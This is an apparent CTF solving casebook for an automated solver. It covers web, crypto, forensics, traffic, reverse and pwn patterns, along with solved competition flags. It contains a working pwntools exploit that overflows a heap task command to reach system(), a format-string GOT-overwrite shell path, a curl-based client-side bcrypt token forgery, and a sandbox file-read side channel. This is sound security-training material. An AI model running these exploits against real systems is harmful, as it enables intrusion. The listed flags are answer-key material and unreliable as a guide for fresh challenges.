# ForgeFlag CTF Casebook

This casebook records recent hands-on CTF solving patterns. Keep entries short, reproducible, and focused on signals that future solvers can recognize.

## How To Use This Casebook

- Treat every case as a pattern, not as a one-off answer.
- Preserve the shortest discovery path: input artifact, decisive clue, exact transform or command, final verification.
- When adding solver logic, convert the pattern into a small synthetic fixture instead of vendoring original challenge files.
- In the Web UI write-up, keep only the solving idea and reproduction steps.

## Universal Workflow

1. Capture the statement, category, artifacts, and target scope.
2. Run cheap triage first: `file`, `strings`, metadata, HTML source, route listing, JSON shape, or protocol framing.
3. Find the shortest evidence path before adding heavy tools.
4. Generate one replay command or script that a human can run again.
5. Record why the first failed run failed, especially missing decoders, wrong category routing, or unclear report wording.

## Historical Coverage Snapshot

ForgeFlag has accumulated these stable pattern families across local fixtures, Web API corpus runs, browser-player runs, user-uploaded tasks, and recent hardening commits:

| Category | Historical Patterns To Keep |
| --- | --- |
| Web | visible flags, hidden same-origin routes, static JS leaks, response headers/cookies, source-derived framework routes, API option leaks, JWT/session hints, SSRF hints, path traversal hints, LFI-to-artifact chains, status-feed object filtering |
| Crypto | reversible encodings, Caesar/ROT/Morse/ASCII forms, XOR and supplied-key classical ciphers, AES-CTR nonce reuse, AES-GCM nonce reuse, Poly1305 key reuse, RSA known factors, low exponent, prime modulus, Fermat close primes, common modulus, shared prime, broadcast e=3, modular matrix conjugation |
| Forensics | raw strings, archives and comments, mail/PowerShell base64, PNG text chunks, PNG trailing data, IHDR height mismatch repair, independent/extra IDAT zlib payloads, JPEG comments/APP markers, encoded image metadata |
| Traffic | HTTP payload flags, DNS split label exfiltration, TCP stream follow-up, HTTP object export, SMTP/FTP/IRC-style streams, AntSword/JSP webshell command/output reconstruction |
| Reverse | static strings, packed/UPX markers, encoded string tables, custom protocol reassembly, esolang word mapping, stripped ELF phrase recovery |
| Pwn | scoped service banner capture, source-level format string, source-level ret2win, CCTF pwn3 format string shell path, menu binary command overwrite through stack/heap logic |
| Misc | binary/octal/decimal ASCII, nested transform chains, archive previews, PNG/JPEG puzzles, magic-extension mismatch, LSB extraction, pickle sandbox triage, hash fingerprinting, Krita/OpenDocument-style ZIP subtypes |

## Web Cases

### Static Client Source Leak

Signal:

- Page copy claims the flag is hidden or protected client-side.
- HTML includes a suspicious script such as `/static/secret.js`.

Reproduction:

```bash
curl -sS https://target/
curl -sS https://target/static/secret.js
```

Solver lesson:

- WebSolver should always parse HTML for `script[src]`, fetch same-origin static JavaScript in scoped mode, and scan comments/literals for flag-like strings.
- The write-up should mention "view page source, follow script path, read comment/string".

### Public Status Page Internal Incident Leak

Signal:

- Status page or incident feed.
- Provided source shows an API filter such as `public=true/false`.
- Internal incidents are near the public feed.

Reproduction:

```bash
curl -sS 'https://target/api/incidents?public=false' | python3 -m json.tool
```

Solver lesson:

- WebSolver should inspect route parameters and try documented boolean variants only inside allowed scope.
- LLM profiler should classify this as IDOR/object filtering or authorization logic, not injection.

### Source-Derived Route And Sink Triage

Signal:

- Source attachment is provided with Flask/FastAPI/Express/Django/Laravel-style route declarations.
- The page itself may not expose hidden endpoints.
- Source includes route handlers with option lists, token/session handling, URL fetches, file path joins, or archive extraction.

Reproduction:

```bash
rg -n "@app\\.|app\\.(get|post)|router\\.|Route\\(|path\\(|send_file|open\\(|requests\\.|jwt|session" source/
```

Solver lesson:

- WebSolver should extract source routes and attach bug-class hints: API option leak, JWT/session, SSRF, and path traversal.
- For multi-stage cases, source-derived Web evidence should be allowed to route into ReverseSolver or ForensicsSolver when an artifact path is discovered.

## Crypto Cases

### AES-CTR Keystream Reuse

Signal:

- Service prints `Encrypted flag`.
- Service encrypts user-controlled plaintext with the same key and nonce.
- Source uses `AES.MODE_CTR` with process-global `KEY` and `NONCE`.

Reproduction:

```python
enc_flag = bytes.fromhex("...")
zero_ct = bytes.fromhex("...")  # encryption of 00 * len(enc_flag)
print(bytes(a ^ b for a, b in zip(enc_flag, zero_ct)).decode())
```

Solver lesson:

- CryptoSolver should flag fixed nonce CTR as a keystream reuse issue and generate a script that sends zero plaintext.
- If remote networking is unstable, ask the user for `Encrypted flag` and the ciphertext of all-zero plaintext; the rest is offline XOR.

### AES-GCM Nonce Reuse

Signal:

- Multiple AES-GCM records share the same nonce under the same key.
- Challenge provides AAD/ciphertext/tag tuples, or source shows nonce reuse.

Reproduction strategy:

- Collect nonce, AAD, ciphertext, and tag for every message.
- Model GHASH equations over `GF(2^128)` to recover or constrain the authentication subkey.
- Use a generated Sage/Python scaffold to verify candidate tags before claiming a plaintext.

Solver lesson:

- CryptoSolver should not pretend to decrypt immediately; it should classify the forbidden-attack workflow and emit a scaffold with all collected fields.
- The write-up should say what evidence is missing if a full forgery/decryption is not possible yet.

### Poly1305 One-Time Key Reuse

Signal:

- Two or more Poly1305 message/tag pairs use the same one-time key.
- Source or protocol shows repeated key/nonce material.

Reproduction strategy:

- Parse messages and tags.
- Build polynomial equations modulo `2^130 - 5`.
- Enumerate carries and solve for reusable key material with Sage or exact integer arithmetic.

Solver lesson:

- CryptoSolver should emit a Sage-oriented helper and record message/tag evidence.
- This is an algebra route, not a wordlist/cracking route.

### RSA Weak Parameter Families

Signals and first moves:

- Known `p`/`q`: compute `phi`, `d`, decrypt.
- Low exponent without padding: test exact integer roots.
- Prime modulus: use `phi = n - 1`.
- Close primes: Fermat factorization.
- Common modulus: combine ciphertexts with extended gcd on exponents.
- Shared prime: `gcd(n1, n2)`.
- Broadcast e=3: CRT then exact cube root.

Solver lesson:

- CryptoSolver should normalize numbered fields such as `n1/e1/c1`, `n2/e2/c2`, and unnumbered `n/e/c`.
- Every recovered RSA case should produce a replayable solve script, not only a finding.

### Matrix Conjugation Over Mod n

Signal:

- Encryption is `C = A^-1 M A mod n`.
- Known pairs `(M, C)` are provided.
- Live ciphertext is a list of encrypted matrices.

Reproduction strategy:

- Recover the change-of-basis matrix `A` up to scalar using equations `M A = A C mod n`.
- Stack linear equations from known pairs over `Z/nZ`.
- If Gaussian elimination over `mod n` hits a non-invertible pivot, compute `gcd(pivot, n)`. A non-trivial factor can let the solve continue over a prime field.
- Work modulo the recovered prime factor first. If the plaintext chunks are much smaller than the prime, residues can be read directly as integers without full CRT reconstruction.
- Use the recovered `A` to decrypt live matrices: `M = A C A^-1 mod n`.
- Decode each plaintext matrix entry into bytes according to the provided chunk size.

Solver lesson:

- CryptoSolver should detect conjugation equations and produce a modular linear algebra solve script.
- For composite `n`, bad-pivot GCD is a useful first move before Sage/CRT-aware solving.
- If only one plaintext matrix position carries printable chunks, score entries by printable byte ratio and flag-format prefix before choosing the decode path.

## Traffic Cases

### AntSword/JSP Webshell PCAP Reconstruction

Signal:

- PCAP contains HTTP/JSP webshell traffic.
- Exported objects or streams contain reversed shell commands such as `cut -c N /flag`.
- Output characters may be encoded, for example ROT13.

Reproduction strategy:

```bash
tshark --export-objects http,out -r capture.pcapng
rg -n "cut -c|flag|base64|eval|assert" out
```

Then:

- Reverse the command object when needed.
- Extract `cut -c N /flag` positions.
- Decode single-character command output, such as ROT13.
- Place each recovered character at its requested index.

Solver lesson:

- TrafficSolver should export HTTP objects, identify AntSword-like command/output pairs, recover positional character reads, and write a concise reconstruction report.

### DNS Split Label Exfiltration

Signal:

- Many DNS queries share a base domain.
- Left-most labels look like chunks of base32/base64/hex data.

Reproduction:

```bash
tshark -r capture.pcapng -Y dns -T fields -e dns.qry.name
```

Solver lesson:

- TrafficSolver should group by base domain, preserve packet order, strip fixed suffixes, concatenate labels, and try transform candidates.

### HTTP Object And Stream Follow-Up

Signal:

- HTTP requests/responses carry files or printable payloads.
- Protocol summary points to a small set of streams.

Reproduction:

```bash
tshark -r capture.pcapng -q -z follow,tcp,ascii,STREAM_ID
tshark --export-objects http,out -r capture.pcapng
```

Solver lesson:

- Store stream IDs, exported object paths, hashes, previews, and recovered flag candidates.
- The write-up should include the exact stream ID or object filename.

### Beacon Host Mismatch And Reused XOR

Signal:

- HTTP capture is mostly normal browsing, but one host has scripted User-Agent traffic, regular polling, and repeated API paths.
- The Host header looks like CDN or telemetry infrastructure, while the destination IP belongs to an unrelated ASN or country.
- Form bodies carry Base64 fields such as `cfg` or `data`; decoded blobs share a long identical prefix.

Reproduction strategy:

```bash
tshark -r capture.pcap -Y http.request \
  -T fields -e frame.number -e ip.src -e ip.dst -e http.host -e http.request.method -e http.request.uri -e http.user_agent
tshark -r capture.pcap \
  -Y 'http.request && http.host == "suspicious.example" && http.file_data' \
  -T fields -e frame.number -e http.request.uri -e http.file_data
```

Then:

- Decode URL-form bodies and Base64 values without converting `+` into spaces.
- Crib common JSON prefixes such as `{"id":"...` against identical ciphertext prefixes. In the SAR-style finance beacon case, this recovered the repeating XOR key `Ar3s_C2!`.
- Decrypt config/result records, then compare declared C2/stage hosts with the actual IP's WHOIS or GeoIP result.
- For Around-the-World style answers, use the real destination country/city rather than the claimed CDN or region string.

Solver lesson:

- TrafficSolver should group HTTP requests by `(host, dst_ip, user_agent)`, score periodic scripted beacons separately from browser traffic, and try known-plaintext repeating-XOR on Base64 form fields with shared prefixes.
- GeoIP/WHOIS evidence should be recorded as a first-class finding when the challenge clue asks where traffic really goes.

## Reverse Cases

### Custom TCP Payload Reassembly Into Source

Signal:

- Generator source says packets are `[magic][seq][len][payload]`.
- Valid packets have magic `ZN` and payload beginning with the sequence ID.
- Source was split by stride: `chunks = [code[i::num_strides] for i in range(num_strides)]`.

Reproduction:

```python
raw = bytes.fromhex(open("output.txt").read().strip())
packets = []
i = 0
while i < len(raw):
    magic, seq, ln = raw[i:i+2], raw[i+2], raw[i+3]
    payload = raw[i+4:i+4+ln]
    if magic == b"ZN" and payload.startswith(str(seq).encode()):
        packets.append((seq, payload[1:].decode()))
    i += 4 + ln

chunks = dict(packets)
code = "".join(chunks[i][j] for j in range(max(map(len, chunks.values()))) for i in range(5) if j < len(chunks[i]))
print(code)
```

Solver lesson:

- ReverseSolver should parse explicit protocol annotations from source and output files before trying decompilation.
- If recovered source contains byte arrays plus XOR keys, emit a direct decode script.

### Word Mapping Esolang

Signal:

- Source maps ASCII codes to slang words, for example `sigma rule 83: yapping("hawk")`.
- Output is a word list.

Reproduction:

```python
import re
rules = open("message.txt").read()
word_to_code = {word: int(code) for code, word in re.findall(r'sigma rule\s+(\d+):\s+yapping\("([^"]*)"\)', rules)}
words = open("output.txt").read().split()
print("".join(chr(word_to_code[word]) for word in words))
```

Solver lesson:

- ReverseSolver should recognize dispatch tables and switch cases that print strings for character codes.
- Treat odd "programming languages" as encoders first; build a reverse dictionary.

### Stripped ELF Phrase Recovery

Signal:

- Stripped Linux ELF asks for an override phrase.
- Strings show prompts and a few suspicious encoded byte strings.

Reproduction strategy:

- Run `strings` to identify success/failure prompts.
- Disassemble around `strlen`, compare loops, or encoded constants.
- Look for XOR/add/sub tables in `.rodata`.
- Reconstruct the expected phrase with a Python script rather than brute forcing. For a check like `((input[i] ^ 0x13) + i) & 0xff == table[i]`, invert each byte as `input[i] = ((table[i] - i) & 0xff) ^ 0x13`.
- Verify statically by reapplying the recovered formula to the candidate phrase; dynamic execution is optional when the host architecture or container image is unavailable.

Solver lesson:

- ReverseSolver should pair prompt strings with nearby validation logic in disassembly.
- ReverseSolver should emit the inverse byte formula, `.rodata` table bytes, and recovered phrase in the write-up.
- IDA/Ghidra MCP should be the next tool when symbols are stripped and the compare loop is not clear from linear disassembly.

### Packed Or UPX-Marked Binary

Signal:

- `strings` or section names mention `UPX`.
- Normal strings/decompilation are sparse or misleading.

Reproduction strategy:

```bash
file binary
strings -a binary | rg -i "upx|packed"
upx -d binary -o unpacked  # only on a copy
```

Solver lesson:

- ReverseSolver should detect packer indicators and record the next safe step before treating missing strings as a dead end.

## Forensics And Misc Cases

### Truncated ZIP With Missing EOCD

Signal:

- `file` identifies a ZIP archive, but `zipinfo` or `unzip -l` reports "End-of-central-directory signature not found".
- Hex view still shows local file headers such as `PK\x03\x04`, filenames, compressed sizes, uncompressed sizes, and CRC fields.

Reproduction:

```python
import binascii
import struct
import zlib

data = open("archive.zip", "rb").read()
offset = 0
while True:
    start = data.find(b"PK\x03\x04", offset)
    if start < 0:
        break
    _, _, _, method, _, _, crc, csize, usize, nlen, xlen = struct.unpack_from("<IHHHHHIIIHH", data, start)
    name = data[start + 30 : start + 30 + nlen].decode()
    body_start = start + 30 + nlen + xlen
    body = data[body_start : body_start + csize]
    plain = zlib.decompress(body, -15) if method == 8 else body
    assert len(plain) == usize
    assert (binascii.crc32(plain) & 0xFFFFFFFF) == crc
    print(name, plain)
    offset = body_start + csize
```

Solver lesson:

- ForensicsSolver should recover local ZIP entries even when the central directory or EOCD is missing.
- The report should preserve the recovered filenames, CRC check result, and any decoded tag or flag from recovered text.

### JPEG COM Base64 Flag

Signal:

- JPEG has a comment marker (`COM`) or metadata field containing Base64-looking text.
- Direct flag scan fails because the flag appears only after decoding.

Reproduction:

```bash
exiftool image.jpg
strings -n 4 image.jpg
printf '%s' 'BASE64_TEXT' | base64 -d
```

Solver lesson:

- ForensicsSolver and MiscSolver should run transform candidates over image metadata, comments, text chunks, and trailing data.
- Write-up must say "found encoded text in JPEG COM comment, decoded with base64", not "strings directly showed the flag".

### PNG IHDR Height Repair

Signal:

- PNG viewer fails or image appears truncated.
- IHDR declared height does not match IDAT-derived scanline count, or CRC is wrong.

Reproduction strategy:

```bash
pngcheck image.png
python3 repair_ihdr_height.py image.png repaired.png
```

Solver lesson:

- MiscSolver and ForensicsSolver should compute plausible derived dimensions and write a repaired artifact path.

### PNG LSB Extraction

Signal:

- PNG appears normal but statement hints at hidden image data.
- LSB scan over RGB channels yields printable text or encoded entities.

Reproduction strategy:

- Try bit plane 1 first.
- Try RGB/RGBA channel orders and row-major traversal.
- Decode extracted text again if it is HTML entities, URL encoding, or Base64.

Solver lesson:

- Image evidence should record recipe details such as `b1,rgb,lsb,xy` so the write-up can be reproduced.

### Extra Or Independent PNG IDAT Payload

Signal:

- PNG has extra compressed chunks or zlib-looking data after the normal image stream.
- `binwalk` may not explain the payload.

Reproduction strategy:

- Parse PNG chunks.
- Try each independent IDAT/zlib stream with `zlib.decompress`.
- Scan decompressed text with transform candidates.

Solver lesson:

- ForensicsSolver should continue after normal PNG parsing and test independent compressed streams.

### Magic Extension Mismatch

Signal:

- Filename says `.jpg`, but magic bytes say PNG, ZIP, gzip, or another container.

Reproduction:

```bash
file artifact
xxd -l 16 artifact
```

Solver lesson:

- Solver routing should follow detected content, not extension. Reports should explicitly mention the mismatch.

### Krita Project Masquerading As ZIP

Signal:

- File extension is `.zip`, but `mimetype` inside says `application/x-krita`.
- Archive contains `maindoc.xml`, `mergedimage.png`, and `*.shapelayer/content.svg`.
- Hidden vector layers each contain one text character.

Reproduction:

```bash
unzip challenge.zip -d out
cat out/mimetype
find out -path '*shapelayer/content.svg' -print
```

Parse the SVG text nodes and sort by x coordinate:

```python
from pathlib import Path
import html, re

items = []
for path in Path("out").glob("**/*.shapelayer/content.svg"):
    text = path.read_text()
    m = re.search(r'<text[^>]*transform="([^"]+)"[^>]*>(.*?)</text>', text, re.S)
    if not m:
        continue
    nums = [float(x) for x in re.findall(r'-?\d+(?:\.\d+)?', m.group(1))]
    x = nums[-2] if m.group(1).startswith("matrix") else nums[0]
    ch = html.unescape(re.sub(r"<.*?>", "", m.group(2)).strip())
    items.append((x, ch))
print("".join(ch for _, ch in sorted(items)))
```

Solver lesson:

- MiscSolver should inspect ZIP `mimetype` entries for OpenDocument/Krita-like containers.
- SVG text extraction and coordinate sorting should be a reusable image/document subroutine.

### Pickle Sandbox Pattern

Signal:

- Misc attachment includes `pickle.loads` or `pickle.load`.
- Surrounding code mentions blacklist, sandbox, allowed globals, or opcode filtering.

Reproduction strategy:

- Do not run untrusted pickle payloads blindly.
- Read the blacklist and allowed opcodes.
- Build a local, controlled reproduction script that shows the bypass path.

Solver lesson:

- MiscSolver should classify the pattern and preserve source lines, even when it does not auto-execute payloads.

### Hash Triage Before Transforms

Signal:

- Text contains 32/40/64 hex strings, bcrypt, sha512crypt, NTLM-like values, or known hash prefixes.

Reproduction strategy:

```bash
hashid value
hashcat --help | rg "mode"
```

Solver lesson:

- CryptoSolver and MiscSolver should fingerprint likely hash modes and ask for bounded wordlist intent before running cracking tools.

## Pwn Cases

### Menu Binary With Stack Variable Overwrite And Heap Command Overwrite

Signal:

- ELF imports `system`.
- Full protections are enabled, but behavior is logic/heap-structure based rather than ROP based.
- Menu has a callsign/auth action, upload action, and diagnostics action.
- A stack `%s` write overwrites a nearby size variable.
- Upload reads that inflated size into a smaller heap chunk.
- Diagnostics calls `system(current_task)`.

Reproduction strategy:

1. Set the allowed buffer limit to the maximum valid value.
2. Use an overlong callsign: `b"A" * 16 + p32(80)` to change `TX_SZ`.
3. Upload `b"B" * 0x30 + b"cat flag.txt\x00"` to overflow into the task command.
4. Run diagnostics to execute `system(current_task)`.

Exploit skeleton:

```python
from pwn import *

io = process("./uplink")
# io = remote("host", port)
io.sendlineafter(b"buffer limit", b"31")
io.sendlineafter(b"cmd>", b"1")
io.sendlineafter(b"callsign:", b"A" * 16 + p32(80))
io.sendlineafter(b"cmd>", b"3")
io.sendafter(b"payload:", b"B" * 0x30 + b"cat flag.txt\x00")
io.sendlineafter(b"cmd>", b"4")
io.interactive()
```

Solver lesson:

- PwnSolver should not stop at checksec when symbols/imports are available.
- Record imported `system`, global heap pointers, menu actions, unsafe `%s`, and `read` sizes as structured evidence.
- For Mac/Apple Silicon, provide an amd64 container runner. Prefer `python:3.11-slim --platform linux/amd64` when Python is needed.

### CCTF pwn3 Format String Shell Path

Signal:

- 32-bit FTP-like service.
- Commands such as `put` and `get`.
- User-controlled file content is printed with `printf(content)`.
- GOT is writable or libc leak plus GOT overwrite is possible.

Reproduction strategy:

- Upload a payload that leaks `printf@got`.
- Resolve libc base.
- Use `fmtstr_payload` to overwrite `printf@got` with `system`.
- Upload `/bin/sh` and trigger `get`.

Solver lesson:

- PwnSolver write-ups for shell-oriented cases should output a full Python exploit script with local/remote mode, binary/libc configuration, and interaction.

### Ret2win Source Pattern

Signal:

- Source contains a win-like function.
- Unsafe input writes into a fixed-size stack buffer.

Reproduction strategy:

```bash
python3 - <<'PY'
from pwn import *
print(cyclic(200))
PY
```

Solver lesson:

- PwnSolver should produce crash harness, cyclic offset instructions, target symbol, and a local/remote pwntools template.

### Format String Source Pattern

Signal:

- Source calls `printf(user_input)`, `fprintf(stream, user_input)`, or equivalent.

Reproduction strategy:

- Probe `%p` positions.
- Identify the offset for controlled bytes.
- Use `fmtstr_payload` only after target write and offset are known.

Solver lesson:

- PwnSolver should separate evidence collection from exploit writes and ask for explicit remote target scope.

## Networking Lessons

- If a CTF service connects but immediately closes with zero bytes, compare from another network path before assuming exploit failure.
- Proxy/VPN paths can break CTF infra even when `nc -vz` says the port is open.
- For deterministic services, split the solve into offline parts: ask the user for small transcripts such as encrypted flag plus all-zero ciphertext.
- Keep remote exploit scripts non-interactive first (`id`, `whoami`, `cat flag.txt`) before trying to hold a shell.

## Recent USCyberGames Hands-On Cases

These cases came from live user-provided targets and artifacts. Keep the exact flags as solved-case references, but convert the techniques into small local fixtures before adding solver coverage.

### Vertex 3D Labs: Encoded STL Backup

Category:

- Web-assisted forensics / 3D asset stego.

Signal:

- The page describes a 3D mesh processing server.
- Response headers leak `X-Archived-Path: /assets_production_system_v3/bak/file_backup.sys`.
- Page copy mentions Windows-native encoded backup blocks.
- The backup looks like a PEM certificate but is actually `certutil -encode` style Base64.

Shortest path:

```bash
curl -sS https://target/assets_production_system_v3/bak/file_backup.sys -o file_backup.sys
python3 - <<'PY'
from pathlib import Path
import base64
s = Path("file_backup.sys").read_text()
b64 = "".join(line.strip() for line in s.splitlines() if "CERTIFICATE" not in line and line.strip())
Path("model.stl").write_bytes(base64.b64decode(b64))
PY
```

Then render the binary STL from a top/orthographic view. The flag was visible as raised geometry:

```text
SVIBGR{n3v3r_d1sm1ss_th3_f1n3_4rts}
```

Solver lesson:

- WebSolver should preserve response headers and promote leaked archive paths.
- ForensicsSolver/MiscSolver should recognize PEM-wrapped data that decodes to `OpenSCAD Model`/binary STL.
- 3D assets need cheap visual render previews, especially top/front/side orthographic projections.

### Wire Text: Multi-Space Morse In A Familiar Rant

Category:

- Misc text stego / Morse transform.

Signal:

- Challenge mentions wire, silence/signal, "What hath God wrought", and four words.
- File text is a recognizable rant, but spacing between words is abnormal.
- Only 2, 3, and 4 spaces appear between tokens.

Shortest path:

```python
from pathlib import Path
import re

s = Path("wire.txt").read_text()
runs = [len(m.group()) for m in re.finditer(r" +", s)]

# 2 spaces = dot, 4 spaces = dash, 3 spaces = letter separator.
groups, cur = [], ""
for n in runs:
    if n == 3:
        groups.append(cur)
        cur = ""
    elif n == 2:
        cur += "."
    elif n == 4:
        cur += "-"
if cur:
    groups.append(cur)
```

Decoded text:

```text
SVIBGR.M0RS3_C0D3_1S_C00L$
```

Final flag:

```text
SVIBGR{M0RS3_C0D3_1S_C00L}
```

Solver lesson:

- Transform triage should include whitespace-run histograms, not only visible characters.
- If decoded Morse uses punctuation as delimiters and the statement gives a flag format, map the punctuation back to braces only after verifying the prefix/body.

### Souvenirs Postcard: JPEG FFD9 Appended ZIP

Category:

- Forensics / appended archive.

Signal:

- JPEG postcard has ordinary metadata and image content.
- `strings` reveals `postcards/*.txt` near the tail.
- `binwalk` shows a ZIP archive immediately after JPEG EOI `FFD9`.

Shortest path:

```bash
binwalk souvenirs.jpg
cp souvenirs.jpg souvenirs.zip
unzip souvenirs.zip -d out
cat out/postcards/04_oman.txt
```

Flag:

```text
SVIUSCG{p0stc4rds_h1dd3n_p4st_th3_FFD9_h0r1z0n}
```

Solver lesson:

- JPEG triage should always check bytes after the last `FFD9`.
- If a ZIP is appended, list entries first and rank text files by title/order rather than dumping binary noise.
- Write-up wording should explicitly say "copy/offset-extract the appended ZIP, then read the relevant entry".

### Intern-Net: Client-Side Bcrypt Hash As Session Token

Category:

- Web auth logic / insecure client-side authentication.

Signal:

- Login page loads `bcrypt.min.js`.
- `/static/js/login.js` retrieves `/api/auth/hash`, verifies the password client-side, and sets `auth_token = base64(hash)`.
- Ordinary registration gives an intern account and reveals a locked Senior Intern announcement.
- Public posts mention `Alex Rivera`, the Senior Intern coordinator.

Shortest path:

```bash
curl -sS -X POST https://target/api/auth/hash \
  -H 'Content-Type: application/json' \
  -d '{"username":"alex.rivera"}'
```

Then Base64-encode the returned bcrypt hash and set it as the `auth_token` cookie before visiting `/announcements`.

Flag:

```text
SVIUSCG{8bb1e559044d7df7f3fac04d124b1e63}
```

Solver lesson:

- WebSolver should fetch same-origin auth JavaScript and flag client-side password verification, exposed hash lookup, and hash-as-token patterns.
- It should enumerate likely usernames only from in-scope page evidence such as author names and email addresses.
- Report the bug as auth bypass/IDOR-like token forgery, not password cracking.

### Lingual Janet: Sandbox Load-Order File Read Side Channel

Category:

- Web sandbox / language interpreter.

Status:

- Paused before full flag recovery, but the core primitive was verified.

Signal:

- Go server writes user Janet code to a temp file, then runs `janet sandbox.janet temp-file`.
- `sandbox.janet` executes `(dofile player-file)` before removing `dofile`, `require`, and `import`.
- Dangerous OS/network functions are removed, but `slurp`/`file/read` remain available.
- The flag path is provided as `/flag.txt`.
- Janet stdout is consumed by the game as move directions, so printing the flag does not appear directly in the HTTP response.

Verified primitive:

```janet
(def flag (slurp "/flag.txt"))
(defn move [state]
  :right)
```

This loaded successfully remotely, and a first side-channel attempt recovered the first byte `S`.

Planned shortest path:

- Read `/flag.txt` at Janet load time.
- Encode one bit or one comparison result per tick by returning `:left` or `:right`.
- Observe the first SSE frame or position changes from `/stream/<session_id>`.
- Prefer one long session that leaks many bits rather than many `/start` requests, because repeated TLS connections were unstable.

Solver lesson:

- WebSolver should parse provided server/source attachments for interpreter load order and sandbox removal timing.
- Sandbox cases need output-channel analysis: stdout, stderr, files, timing, game state, and SSE fields can all be exfiltration paths.
- Post-run Critic should record "read primitive works but output channel is consumed" as a blocker with a side-channel rerun plan.

## ForgeFlag Backlog From These Cases

- Add static JS fetch and comment/string extraction for same-origin scripts.
- Add public/private boolean API parameter hints for status/feed style web apps.
- Add image metadata transform decoding to both ForensicsSolver and MiscSolver.
- Add ZIP container subtype detection for Krita/OpenDocument style archives.
- Add SVG text coordinate extraction.
- Add certutil/PEM-wrapped binary decoding and STL orthographic render previews.
- Add whitespace-run stego analysis before generic text transforms.
- Add JPEG EOI appended ZIP extraction hints to image write-ups.
- Add Web auth JavaScript checks for exposed bcrypt hashes and hash-as-token cookies.
- Add sandbox source triage for interpreter load order, leftover file APIs, and side-channel output routes.
- Add CTR fixed nonce exploit script generation.
- Add modular matrix conjugation solve script generation.
- Improve PwnSolver deep triage: unsafe scanf, stack variable overwrite, heap chunk adjacency, imported `system`, and generated non-interactive command execution exploit.
- Improve report wording so write-ups describe exactly how the flag was recovered, not generic solver summaries.
